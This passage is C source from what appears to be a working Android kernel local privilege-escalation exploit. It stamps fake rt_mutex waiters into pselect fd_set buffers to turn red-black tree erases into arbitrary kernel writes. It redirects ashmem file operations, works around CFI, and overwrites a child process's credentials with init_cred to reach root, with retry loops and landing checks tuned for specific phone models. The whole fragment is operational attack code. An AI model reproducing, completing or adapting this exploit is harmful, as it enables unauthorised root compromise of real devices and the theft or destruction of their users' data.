        } else if (env_flag("MODE4_ION_FOPS", 0) || env_flag("MODE4_EXP_N", 0)) {
          uint64_t fops_off =
              (active_offsets && active_offsets->off_ashmem_fops)
                  ? active_offsets->off_ashmem_fops
                  : ASHMEM_FOPS_OFF;
          uint64_t cfg_w_off =
              (active_offsets && active_offsets->off_configfs_bin_write_iter)
                  ? active_offsets->off_configfs_bin_write_iter
                  : CONFIGFS_BIN_WRITE_ITER_OFF;
          uint64_t ashmem_fops_p0 = data_addr(KIMAGE_TEXT_BASE + fops_off);
          /*
           * CRITICAL: rb_erase only-right calls rb_set_parent_color(child).
           * child (= right) MUST be writable spray — never a CFI JT in .text
           * (N1 r1 softboot: right=write_jt → store into text).
           * Value written into the fops slot is therefore fake_fops (table ptr).
           * That is wrong for .write (needs func JT) but proves erase + RO/RW;
           * full redirect remains MISC←fake_fops (ION_ROOT / classic).
           */
          uint64_t slot_val = (uint64_t)fake_fops;
          (void)cfg_w_off;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_prio = 90;
          stack_deadline = 0x1000;
          if (env_flag("MODE4_ION_FOPS", 0)) {
            /* Root erase: lock+8 = ashmem_fops.WRITE, wait_lock at .READ == 0 */
            tree_pc = 1;
            tree_r = slot_val;
            tree_l = 0;
            stack_lock = ashmem_fops_p0 + (uint64_t)FOPS_READ_OFF;
            pr_info("stack mode4 ION_FOPS(N1) lock=ashmem_fops+0x10=%016llx "
                    "parent=1 right=fake_fops=%016llx left=0 "
                    "(root → *fops.write=fake_fops; wait_lock at .read==0; "
                    "right must be spray not JT)\n",
                    (unsigned long long)stack_lock,
                    (unsigned long long)slot_val);
          } else {
            /* Classic only-right: parent at .read addr → write parent->rb_right */
            tree_pc = (ashmem_fops_p0 + (uint64_t)FOPS_READ_OFF) & ~3ULL;
            tree_r = slot_val;
            tree_l = 0;
            stack_lock = fake_lock;
            pr_info("stack mode4 EXP_N(N2) parent=ashmem_fops+0x10=%016llx "
                    "right=fake_fops=%016llx left=0 lock=fake "
                    "(classic → *fops.write; no MISC; right=spray)\n",
                    (unsigned long long)tree_pc,
                    (unsigned long long)slot_val);
          }
        } else if (env_flag("MODE4_REF_LEFT", 0) || env_flag("MODE4_REF_LEFT_PI", 0) ||
            env_flag("MODE4_TOP_LEFT", 0)) {
          /*
           * Ref only-left: parent=value, right=0, left=MISC → *MISC=value.
           * TOP_LEFT: PI-only only-left + prio=0 (max top) vs W0=250 +
           * optional MODE4_OWNER_UNLOCK for PI dequeue on unlock path.
           */
          uint64_t val = fake_fops; /* parent_color written into *MISC */
          int pi_only = env_flag("MODE4_TOP_LEFT", 0) ||
                        (env_flag("MODE4_REF_LEFT_PI", 0) &&
                         !env_flag("MODE4_REF_LEFT", 0));
          if (pi_only) {
            tree_pc = 0;
            tree_r = 0;
            tree_l = 0;
            if (env_flag("MODE4_TOP_LEFT", 0)) {
              stack_prio = 0;
              stack_deadline = 0x1000;
              pr_info("stack mode4 TOP_LEFT(H) main=0 pi parent=fake_fops "
                      "right=0 left=MISC prio=0 deadline=0x1000 "
                      "(force top + only-left PI erase)\n");
            } else {
              pr_info("stack mode4 REF_LEFT_PI(G-pi) main=0 pi "
                      "parent=fake_fops right=0 left=MISC (only-left write)\n");
            }
          } else {
            tree_pc = val;
            tree_r = 0;
            tree_l = misc;
            pr_info("stack mode4 REF_LEFT(G) main+pi parent=fake_fops "
                    "right=0 left=MISC (ref only-left; *MISC=fake_fops)\n");
          }
          pi_parent = val;
          pi_right = 0;
          pi_left = misc;
        } else if (env_flag("MODE4_CLASSIC_MAPPED", 0) ||
                   env_flag("MODE4_CLASSIC_LEAF", 0) ||
                   env_flag("MODE4_CLASSIC_NOP", 0)) {
          /*
           * CLASSIC_MAPPED: parent=MISC-8, right=fake_fops → *MISC=fake_fops
           * CLASSIC_LEAF:   right=0 → *MISC=0
           * CLASSIC_NOP:    right=real ashmem_fops table (P0) → *MISC unchanged
           *   Critical split for plateau:
           *   - NOP ALIVE  => erase+MISC parent OK; softboot was BAD fake_fops
           *   - NOP SOFTBOOT => erase/MISC-parent walk itself panics
           * SAFE/OWNER0: prio=200, owner=0 (see KERNEL_5_10_RTMUTEX_WRITE_PATH)
           */
          uint64_t fops_tbl_off =
              (active_offsets && active_offsets->off_ashmem_fops)
                  ? active_offsets->off_ashmem_fops
                  : ASHMEM_FOPS_OFF;
          uint64_t real_fops_tbl = data_addr(KIMAGE_TEXT_BASE + fops_tbl_off);
          tree_pc = (misc - 8) & ~3ULL;
          if (env_flag("MODE4_CLASSIC_LEAF", 0))
            tree_r = 0;
          else if (env_flag("MODE4_CLASSIC_NOP", 0))
            tree_r = real_fops_tbl;
          else
            tree_r = fake_fops;
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          if (env_flag("MODE4_CLASSIC_PRIO_MATCH", 0)) {
            stack_prio = 120;
            stack_deadline = 0;
            pr_info("stack mode4 CLASSIC+PRIO_MATCH parent=MISC-8 "
                    "right=%s prio=120 (skip erase)\n",
                    env_flag("MODE4_CLASSIC_LEAF", 0) ? "0/LEAF" : "fops");
          } else if (env_flag("MODE4_CLASSIC_LEAF", 0)) {
            stack_prio = 90;
            stack_deadline = 0x1000;
            pr_info("stack mode4 CLASSIC_LEAF parent=MISC-8 right=0 left=0 "
                    "prio=90 (erase → *MISC=0)\n");
          } else if (env_flag("MODE4_CLASSIC_NOP", 0)) {
            stack_prio = 200;
            stack_deadline = 0x1000;
            pr_info("stack mode4 CLASSIC_NOP parent=MISC-8 right=real_fops=%016llx "
                    "prio=200 (erase no-op *MISC; isolate softboot source)\n",
                    (unsigned long long)real_fops_tbl);
          } else if (env_flag("MODE4_CLASSIC_SAFE", 0) ||
                     env_flag("MODE4_LOCK_OWNER0", 0)) {
            stack_prio = 200;
            stack_deadline = 0x1000;
            pr_info("stack mode4 CLASSIC_SAFE parent=MISC-8 right=fake_fops "
                    "prio=200 (erase write; not top vs W0=100; pair "
                    "MODE4_LOCK_OWNER0)\n");
          } else {
            pr_info("stack mode4 CLASSIC_MAPPED(A) main parent=MISC-8 "
                    "right=fake_fops left=0 pi=0 task=init lock=fake "
                    "(erase target A; softboot risk with consumer)\n");
          }
        } else if (env_flag("MODE4_PI_CLASSIC", 0) || env_flag("MODE4_TOP_PI", 0)) {
          tree_pc = 0;
          tree_r = 0;
          tree_l = 0;
          pi_parent = (misc - 8) & ~3ULL;
          pi_right = fake_fops;
          pi_left = 0;
          /* C: prio=0 max RT preference vs W0=250; B: prio=1 vs W0=200 */
          stack_prio = env_flag("MODE4_TOP_PI", 0) ? 0 : 1;
          pr_info("stack mode4 %s main=0 pi parent=MISC-8 right=fake_fops "
                  "left=0 prio=%llu (PI erase if top)\n",
                  env_flag("MODE4_TOP_PI", 0) ? "TOP_PI(C)" : "PI_CLASSIC(B)",
                  (unsigned long long)stack_prio);
        } else if (env_flag("MODE4_EXP_F", 0) || env_flag("MODE4_EXP_E2", 0) ||
                   env_flag("MODE4_E2_SPARSE", 0)) {
          /*
           * only-right inverted: *right = parent_color ⇒ *MISC = fake_fops.
           * lock stays fake_lock (wait_lock=0) so adjust can take the lock —
           * unlike ION_ROOT (MISC-8 wait_lock is ashmem name ptr).
           * MODE4_E2_SPARSE / default SPARSE_FDS: avoid dup2 of MISC bit mask.
           * EXP_F additionally forces prio/deadline mismatch for adjust_pi.
           */
          tree_pc = fake_fops & ~3ULL;
          tree_r = misc;
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          stack_lock = fake_lock;
          if (env_flag("MODE4_EXP_F", 0)) {
            stack_prio = 90;          /* != typical 100/120 nice band */
            stack_deadline = 0x1000;  /* != 0 for dl compare paths */
            pr_info("stack mode4 EXP_F main parent=fake_fops right=MISC left=0 "
                    "prio=90 deadline=0x1000 lock=fake (EDEADLK+setprio; "
                    "SPARSE_FDS default)\n");
          } else {
            stack_prio = 90;
            stack_deadline = 0x1000;
            pr_info("stack mode4 EXP_E2/E2_SPARSE main parent=fake_fops "
                    "right=MISC left=0 lock=fake_lock prio=90 "
                    "(*MISC=fake_fops if erase; SPARSE_FDS default)\n");
          }
        } else if (env_flag("MODE4_EXP_E", 0)) {
          /* fake_lock = page + LOCK_OFF → SCRATCH = page + SCRATCH_OFF */
          uint64_t spray_parent =
              (fake_lock - (uint64_t)LOCK_OFF + (uint64_t)SCRATCH_OFF) & ~3ULL;
          tree_pc = spray_parent;
          tree_r = fake_fops;
          tree_l = 0;
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          pr_info("stack mode4 EXP_E main parent=spray_SCRATCH=%016llx "
                  "right=fake_fops left=0 pi=0 (non-MISC classic; no fops "
                  "redirect expected)\n",
                  (unsigned long long)spray_parent);
        } else if (env_flag("MODE4_STACK_PI", 0) &&
                   !env_flag("MODE4_NO_GADGET", 0)) {
          pi_parent = fake_fops & ~3ULL;
          pi_right = misc;
          pi_left = 0;
          pr_info("stack mode4 STACK_PI inverted (legacy softboot risk)\n");
        } else {
          pi_parent = 0;
          pi_right = 0;
          pi_left = 0;
          pr_info("stack mode4 BASELINE main=0,0,0 pi=0,0,0 task=init_task "
                  "lock=fake_lock (plateau)\n");
        }
        struct pselect_waiter_word words[] = {
          /* JoinChang compact 5.10 layout (verified on CPH2521):
           * waiter words 0-9 at natural struct offsets, shift=0.
           * tree_entry: pc@0 right@1 left@2; pi_tree@3-5;
           * task@6 lock@7 prio@8 deadline@9.
           * The walk needs lock+task+prio; the write comes from
           * the SPRAYED W0 fake waiter (heap), not the stamp.
           *
           * MODE4_SLIDE (Aristotle): the write comes from the STACK
           * stamp instead — tree_pc(word0)=VALUE, tree_left(word2)=TARGET.
           * The main-tree erase (rt_mutex_dequeue from the walk) does
           * child->__rb_parent_color = pc -> *TARGET = VALUE.
           * Default: VALUE=0 (write zero), TARGET=0 (no write). */
          {0, tree_pc, "tree_pc"},
          {1, tree_r, "tree_right"},
          {2, tree_l, "tree_left"},
          {3, 0, "pi_parent"},
          {4, 0, "pi_right"},
          /* DATAONLY: pi_left = write target. The stack pi-tree erase
           * (dequeue_pi) with parent_color=0 (VALUE, red) and one left
           * child executes child->__rb_parent_color = pc -> *target=0.
           * pi_parent/pi_right stay 0 (= the value + no right child). */
          {5, env_flag("MODE4_DATAONLY", 0)
                   ? (uint64_t)pselect_write_target()
                   : 0,
           "pi_left"},
          {6, stack_task, "task"},
          {7, stack_lock, "lock"},
          {8, stack_prio, "prio"},
          {9, stack_deadline, "deadline"},
        };
        for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
          struct pselect_waiter_word *w = &words[i];
          pselect_put_waiter_word(
              in, out, ex, words_per_set, w->word, w->value, w->name);
        }
        if (env_flag("MODE4_ION_ROOT", 0) || env_flag("MODE4_ION_SAFE", 0) ||
            env_flag("MODE4_ION_FOPS", 0) || env_flag("MODE4_EXP_N", 0) ||
            env_flag("MODE4_ROOT_SPRAY", 0) || env_flag("MODE4_ZERO_NAME", 0)) {
          pr_info("pselect ION/ROOT/ZERO place lock=%016llx tree_pc=%016llx "
                  "right=%016llx\n",
                  (unsigned long long)stack_lock,
                  (unsigned long long)tree_pc,
                  (unsigned long long)tree_r);
        }
        goto stack_words_done;
      } else if (pselect_custom_write_enabled() &&
                 !env_flag("MODE4_DATAONLY", 0)) {
        stack_task = fake_task;
      }
      struct pselect_waiter_word words[] = {
        {2, 0, "tree_pc"},
        {3, 0, "tree_right"},
        {4, 0, "tree_left"},
        {5, pi_parent, "pi_parent"},
        {6, pi_right, "pi_right"},
        {7, pi_left, "pi_left"},
        {8, stack_task, "task"},
        {9, fake_lock, "lock"},
        {10, 1, "prio"},
        {11, 0, "deadline"},
      };
      for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
        struct pselect_waiter_word *w = &words[i];
        pselect_put_waiter_word(
            in, out, ex, words_per_set, w->word, w->value, w->name);
      }
    stack_words_done:;
    }
  }
#else
  {
  struct pselect_waiter_word words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK),
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct pselect_waiter_word *w = &words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
  }
#endif
}

void do_pselect_fake_lock_route(void) {
  /* DATAONLY: fake_lock alone suffices (static .data lock; no
   * page/fops needed — the stack stamp carries the write). */
  int dataonly = env_flag("MODE4_DATAONLY", 0);
  if ((!dataonly && (!page_base || !fake_fops)) || !fake_lock) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  int chain = env_flag("MODE4_CHAIN", 0);
  int zion = env_flag("MODE4_ZION", 0);
  int zi = env_flag("MODE4_ZI", 0);
  int wion = env_flag("MODE4_WION", 0);
  int zio = env_flag("MODE4_ZIO", 0);
  int pad3 = env_flag("MODE4_PAD3", 0);
  int vs = env_flag("MODE4_VERIFY_SWAP", 0);
  int sc = env_flag("MODE4_STATIC_CHAIN", 0);
  int vs_retries = 0; /* reclaim-loss retries consumed by VERIFY_SWAP */
  const int VS_MAX_RECLAIM_RETRIES = 4;
  int cred_mode = env_flag("MODE4_SLIDE_CRED", 0) && g_uid0_child_pid > 0;
  int oracle_mode = env_flag("MODE4_SLIDE", 0) &&
                    !env_flag("MODE4_SLIDE_SWAP", 0) && g_bootid_before[0];
  int max_att = (cred_mode || oracle_mode)
                    ? env_int_range("LANDING_RETRY_ATTEMPTS", 12, 1, 24)
      : env_flag("MODE4_SC_UMASK", 0) ? 3
      : (env_flag("MODE4_SC_DIAG", 0) ? 2 : (sc ? 7 : (vs ? 2
                   : (pad3 ? 3
                          : (zio || chain ? 3
                                         : ((zion || zi || wion)
                                                ? 2
                                                : PSELECT_CFI_ROUTE_ATTEMPTS))))));
  if (sc)
    pr_info("MODE4_STATIC_CHAIN=1: 7 deterministic walks - build fops "
            "table in kernel image tail, then *MISC swap. No spray.\n");
  else if (vs)
    pr_info("MODE4_VERIFY_SWAP=1: phase1 spray-marker oracle (BSS lock), "
            "phase2 *MISC=fake_fops clone swap — abort ALIVE if the peek "
            "verify says the skb reclaim did not land on the leaked mm page\n");
  else if (pad3)
    pr_info("MODE4_PAD3=1: phase1 MISC+16=0, phase2 MISC+8=0, "
            "phase3 *MISC=fake_fops (pad toxic rb neighbors)\n");
  else if (zio)
    pr_info("MODE4_ZIO=1: phase1 ZERO_NAME, phase2 ZERO_OWNER, "
            "phase3 ION_SAFE (wait_lock+owner quiet then *MISC)\n");
  else if (wion)
    pr_info("MODE4_WION=1: phase1 WAITLOCK0 *name=PAGE_OFFSET (wait_lock=0), "
            "phase2 ION_SAFE root *MISC=fake_fops\n");
  else if (zi)
    pr_info("MODE4_ZI=1: phase1 ZERO_NAME leaf *name=0, phase2 ION_SAFE "
            "root *MISC=fake_fops (avoid only-left MISC re-enqueue walk)\n");
  else if (zion)
    pr_info("MODE4_ZION=1: phase1 NAME0 only-left *name=0, phase2 ION_SAFE "
            "(live_sync; no MISC-16 parent)\n");
  else if (chain)
    pr_info("MODE4_CHAIN=1: phase1 ZERO_NAME, phase2 ZERO_OWNER, "
            "phase3 ION_SAFE (same process; rb-leaf fops)\n");
  for (int route_attempt = 1; route_attempt <= max_att; route_attempt++) {
    if (sc || vs || pad3 || zion || zi || wion || zio || chain) {
      g_mode4_chain_phase = route_attempt;
      /* Each walk must change waiter prio or setattr no-ops. */
      consumer_nice = PSELECT_CONSUMER_NICE - (route_attempt - 1);
    }
    if (route_attempt != 1) {
      int reuse_page =
          ((sc || vs || chain || zion || zi || wion || zio || pad3) &&
           route_attempt >= 2 && page_base && fake_fops) ||
          cred_mode || oracle_mode; /* SLIDE_CRED/SLIDE re-stamp the SAME
                      * BSS overlay — never re-spray between checked
                      * attempts. */
      if (!reuse_page) {
        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
        if (!page_base || !fake_lock || !fake_fops) {
          cfi_last_step = 34;
          cfi_last_errno = errno;
          pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                   "lock=%016zx fops=%016zx\n",
                   route_attempt, page_base, fake_lock, fake_fops);
          break;
        }
      } else {
        pr_info("MODE4_%s reuse FOPS page phase=%d\n",
                pad3 ? "PAD3"
                     : (zio ? "ZIO"
                            : (wion ? "WION"
                                    : (zi ? "ZI" : (zion ? "ZION" : "CHAIN")))),
                g_mode4_chain_phase);
        durable_proof_log(pad3 ? "pad3_reuse_page"
                               : (zio ? "zio_reuse_page"
                                      : (wion ? "wion_reuse_page"
                                              : (zi ? "zi_reuse_page"
                                                    : (zion ? "zion_reuse_page"
                                                            : "chain_reuse_page")))));
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    /*
     * Placement audit (nfds=320 → words_per_set=5 on aarch64):
     * shift + waiter_word → set/index. With default shift=-2:
     *   tree@w2→in[0], pi@w5→in[3], task@w8→out[1], lock@w9→out[2]
     * Old logs only printed in0/in3/out0/ex* and missed lock/task.
     */
    {
      int wps = pselect_words_per_set();
      int sh = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
      pr_info("pselect route setup attempt=%d simple=%d shift=%d wps=%d "
              "page=%016zx fake_lock=%016zx fake_w0=%016zx fake_task=%016zx\n",
              route_attempt,
              env_flag("PSELECT_SIMPLE_LAYOUT", 0), sh, wps,
              page_base, fake_lock, fake_w0, fake_task);
      pr_info("pselect place tree=%016llx pi=%016llx task=%016llx lock=%016llx "
              "prio=%016llx (expect task≈init/fake lock≈fake_lock)\n",
              (unsigned long long)fdset_get_word(&in, 0),
              (unsigned long long)fdset_get_word(&in, 3),
              (unsigned long long)fdset_get_word(&out, 1),
              (unsigned long long)fdset_get_word(&out, 2),
              (unsigned long long)fdset_get_word(&out, 3));
      if (sh == -2 && wps == 5) {
        uint64_t got_lock = fdset_get_word(&out, 2);
        uint64_t got_task = fdset_get_word(&out, 1);
        /* ION / CHAIN phase3: lock=MISC-8 (kernel), not spray fake_lock. */
        int ion_lock = env_flag("MODE4_ION_ROOT", 0) ||
                       env_flag("MODE4_ION_SAFE", 0) ||
                       env_flag("MODE4_ION_FOPS", 0) ||
                       g_mode4_chain_phase == 3 ||
                       (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) ||
                       (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2) ||
                       (env_flag("MODE4_WION", 0) && g_mode4_chain_phase == 2);
        if (!ion_lock && got_lock != (uint64_t)fake_lock)
          pr_warning("pselect LOCK MISPLACE got=%016llx want=%016zx "
                     "(overlay misaligned -> softboot risk)\n",
                     (unsigned long long)got_lock, fake_lock);
        if (got_task == 0)
          pr_warning("pselect TASK MISPLACE got=0 (overlay misaligned)\n");
      }
    }
    fflush(stdout);
    fsync(STDOUT_FILENO);
    {
      int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
                     O_WRONLY | O_CREAT | O_APPEND, 0644);
      if (sfd >= 0) {
        char buf[128];
        int n = snprintf(buf, sizeof(buf),
                         "pselect_setup attempt=%d shift=%d\n", route_attempt,
                         env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT,
                                       -14, 14));
        if (n > 0) (void)write(sfd, buf, (size_t)n);
        fsync(sfd);
        close(sfd);
      }
    }
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    /*
     * MODE4_NO_CONSUMER=1: do not punch sched_setattr/FUTEX during select.
     * Isolates softboot in select overlay alone vs consumer×owner race.
     * Route success will stay 0; goal is survive select.
     */
    if (env_flag("MODE4_NO_CONSUMER", 0)) {
    atomic_store(&punch_consume_go, 0);
      pr_info("pselect NO_CONSUMER=1 (no sched_setattr punch; survive-test)\n");
    } else {
      atomic_store(&punch_consume_go, route_attempt);
    }

    struct timeval timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_usec = PSELECT_TIMEOUT_USEC,
#else
      .tv_usec = 0,
#endif
    };

    pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
    fflush(stdout);
    fsync(STDOUT_FILENO);
    {
      int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
                     O_WRONLY | O_CREAT | O_APPEND, 0644);
      if (sfd >= 0) {
        const char *m = "pselect_pre_select\n";
        (void)write(sfd, m, strlen(m));
        fsync(sfd);
        close(sfd);
      }
    }
    errno = 0;
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    int saved_errno = errno;
    pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
    {
      int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
                     O_WRONLY | O_CREAT | O_APPEND, 0644);
      if (sfd >= 0) {
        char buf[64];
        int n = snprintf(buf, sizeof(buf), "pselect_post_select ret=%d\n", ret);
        if (n > 0) (void)write(sfd, buf, (size_t)n);
        fsync(sfd);
        close(sfd);
      }
    }
    atomic_store(&punch_consume_go, 0);
    /* The consumer increments calls BEFORE sched_setattr and success only
     * AFTER its O_SYNC post_setattr logging (milliseconds). Poll briefly so
     * the snapshot does not race the sequence and misreport the phase. */
    for (int w = 0; w < 300; w++) {
      calls = atomic_load(&consumer_calls);
      success = atomic_load(&consumer_success);
      if (calls > 0 && success > 0)
        break;
      usleep(10000);
    }

    if (env_flag("MODE4_SC_BOOTID_ALL", 0) ||
        env_flag("MODE4_SC_DIAG", 0)) {
      char bb[48] = {0};
      char bpath[64];
      snprintf(bpath, sizeof(bpath), "%s",
               env_flag("MODE4_SC_MODPROBE", 0)
                   ? "/proc/sys/kernel/modprobe" : "/proc/sys/kernel/random/boot_id");
      int bf = open(bpath, O_RDONLY | O_CLOEXEC);
      if (bf >= 0) {
        ssize_t rn = read(bf, bb, sizeof(bb) - 1);
        (void)rn;
        close(bf);
      }
      pr_info("SC_BOOTID_READBACK ph=%d bootid=%.20s\n",
              route_attempt, bb);
    }
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d "
            "owner_unlock_done=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec,
            atomic_load(&owner_unlock_done));

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (env_flag("MODE4_SWAP_NOCFI", 0)) {
        /* Bisect: swap landed, deliberately never open ashmem here.
         * Main may PLAIN-STORE NULL into fake_fops.llseek then open.
         * Do not sleep in this worker — that pinned core 7 and blocked
         * the in-process repair walk. Spray fds stay in the process. */
        if (cred_mode || oracle_mode) {
          /* NOCFFI arm previously swallowed ALL custom writes with an
           * unconditional route_verified — the cred/oracle punches never
           * reached their landing checks (08-30 fire). Same checked
           * retry here before deciding. */
          int canary = env_flag("UID0_COMM_CANARY", 0);
          uint32_t cq = cred_mode ? uid0_child_getuid_query() : 9999;
          if (cred_mode)
            pr_info("child uid query attempt=%d -> %u\n", route_attempt, cq);
          int landed = canary ? uid0_child_comm_landed()
                              : (cred_mode ? (cq == 0 || uid0_payload_fired())
                                           : bootid_changed());
          if (cred_mode && cq == 0) {
            /* cred LANDED: send G so the child execs the payload NOW */
            char g = 'G';
            if (g_uid0_cmd_w >= 0)
              (void)write(g_uid0_cmd_w, &g, 1);
          }
          if (landed)
            uid0_log_landing_signals("landing signals");
          if (landed) {
            route_verified = 1;
            pr_info("%s LANDED attempt=%d/%d (nocfi arm)\n",
                    cred_mode ? "CRED" : "ORACLE", route_attempt, max_att);
            live_sync_log("UID0", cred_mode ? "cred_landed" : "oracle_landed");
            durable_proof_log(cred_mode ? "uid0_cred_LANDED"
                                        : "oracle_LANDED");
          } else {
            pr_info("%s punch miss attempt=%d/%d - re-stamp (nocfi arm)\n",
                    cred_mode ? "cred" : "oracle", route_attempt, max_att);
            live_sync_log("UID0",
                          cred_mode ? "cred_punch_miss" : "oracle_punch_miss");
            if (cred_mode && !canary && g_uid0_task_base) {
              /* SLOT SWEEP: the comm canary proved stores land EXACTLY at
               * the aimed slot — a miss means the SLOT is wrong for this
               * build. Advance to the next candidate; the next attempt
               * rebuilds the fdset from pselect_custom_target. */
              if (g_uid0_slot_idx + 1 < g_uid0_slot_ncand) {
                g_uid0_slot_idx++;
                pselect_custom_target =
                    g_uid0_task_base +
                    (uintptr_t)g_uid0_slot_candidates[g_uid0_slot_idx];
                pr_info("slot sweep -> +0x%llx\n",
                        (unsigned long long)
                            g_uid0_slot_candidates[g_uid0_slot_idx]);
              }
            }
          }
        } else {
        pr_info("SWAP_NOCFI: skipping post-walk cfi probe fake_fops=%016zx\n",
                fake_fops);
        route_verified = 1;
        }
      } else if (pselect_custom_write_enabled()) {
        if (env_flag("MODE4_SLIDE", 0) && !env_flag("MODE4_SLIDE_SWAP", 0) &&
            g_bootid_before[0]) {
          /* oracle landing-checked retry: boot_id changes iff the redirect
           * store landed (QEMU-verifiable; same re-stamp mechanics as the
           * cred punch). */
          if (bootid_changed()) {
            cfi_last_step = 0;
            route_verified = 1;
            pr_info("ORACLE LANDED attempt=%d/%d\n", route_attempt, max_att);
            live_sync_log("WP", "oracle_landed");
            durable_proof_log("oracle_LANDED");
          } else {
            pr_info("oracle store miss attempt=%d/%d - re-stamp\n",
                    route_attempt, max_att);
            live_sync_log("WP", "oracle_punch_miss");
          }
        } else if (env_flag("MODE4_SLIDE_CRED", 0) && g_uid0_child_pid > 0) {
          /*
           * LANDING-CHECKED RETRY (PCKM00 lesson, 08-30): single-attempt
           * cred punches landed only ~1-in-5 (6 verified misses, CapEff
           * diagnostic). The reference exploit reaches ~97% by re-stamping
           * the SAME dangling waiter up to 24x with rotating delays and a
           * per-attempt verification. Our landing signal: the child's
           * CapEff flips nonzero when *cred=init_cred lands. Miss ->
           * route_verified stays 0 -> the loop re-stamps with the next
           * delay in the rotation.
           */
          g_uid0_cred_landed = uid0_child_capeff_landed();
          if (g_uid0_cred_landed) {
            cfi_last_step = 0;
            cfi_last_errno = 0;
            route_verified = 1;
            pr_info("CRED LANDED attempt=%d/%d\n", route_attempt, max_att);
            live_sync_log("UID0", "cred_landed");
            durable_proof_log("uid0_cred_LANDED");
          } else {
            pr_info("cred punch miss attempt=%d/%d - re-stamp next delay\n",
                    route_attempt, max_att);
            live_sync_log("UID0", "cred_punch_miss");
          }
        } else {
          cfi_last_step = 0;
          cfi_last_errno = 0;
          route_verified = 1;
        }
        if (route_verified && active_offsets &&
            active_offsets->off_system_unbound_wq && !root_child_done) {
          try_cfi_stage();
        }
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    /*
     * VERIFY_SWAP gate: after phase 1's oracle walk, peek (non-destructive)
     * the sprayed stream for the marker at fake_fops+0x90. Only a verified
     * page (skb reclaim actually landed on the leaked mm page) may proceed
     * to phase 2's live *MISC swap. On mismatch the reclaim lost the buddy
     * race — retry the whole mm-churn + spray + oracle (bounded) instead of
     * burning the fire: each retry is one fresh reclaim gamble, and a lost
     * gamble costs at most one stray qword in a foreign page.
     */
    if (vs && route_attempt == 1) {
      int v = wproof_spray_verify((uint64_t)fake_fops + 0x80);
      durable_proof_log(v == 1 ? "vs_phase1_VERIFIED"
                               : (v == 0 ? "vs_phase1_MISMATCH"
                                         : "vs_phase1_NOTABLE"));
      pr_info("VERIFY_SWAP phase1 verify ret=%d (1=page verified)\n", v);
